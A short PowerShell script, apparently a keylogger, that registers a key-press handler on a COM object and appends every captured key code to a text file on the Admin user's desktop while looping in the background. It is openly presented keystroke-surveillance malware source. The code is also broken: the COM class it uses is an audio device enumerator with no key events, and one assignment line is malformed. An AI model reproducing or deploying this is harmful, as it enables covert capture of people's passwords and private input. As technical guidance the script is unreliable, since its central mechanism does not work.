# Define the path to the log file
$logFile = "C:\Users\Admin\Desktop\keylog.txt"

# Create a new instance of the keylistener COM object
$keyListener = New-Object -ComObject MMDevAPI.MMDeviceEnumerator
$null = [console]::TreatControlCAsInput = $true

# Define a function to handle key events
function OnKeyPress($event)
{
    $pressedKey = $event.VirtualKeyCode

    # Append the pressed key to the log file
    Add-Content -Path $logFile -Value $pressedKey
}

# Register the key event handler
Register-ObjectEvent -InputObject $keyListener -EventName "OnKeyDown" -Action { OnKeyPress $EventArgs }

# Run the script in the background
while($true)
{
    Start-Sleep -Seconds 1
}